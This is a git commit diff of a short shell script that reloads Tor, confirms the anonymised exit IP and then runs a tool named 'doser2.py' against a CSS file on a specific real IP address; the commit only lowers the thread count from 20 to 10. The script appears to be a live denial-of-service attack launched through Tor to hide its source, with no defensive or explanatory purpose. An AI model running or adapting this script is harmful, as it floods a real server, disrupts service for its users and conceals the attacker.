5153c08dcf3cd246a1dbe00c42105a4d39e8a8cc
padronrucsunat <162722176+padronrucsunat@users.noreply.github.com>
2024-03-11 09:51:29 -0500

    Update sigaa24.sh

--- sigaa24.sh
+++ sigaa24.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 service tor reload &>/dev/null
 curl --socks5 127.0.0.1:9050 ip.p3terx.com
-python3 doser2.py -g 'http://181.224.238.51/static/app-assets/css/app.css' -t 20
+python3 doser2.py -g 'http://181.224.238.51/static/app-assets/css/app.css' -t 10
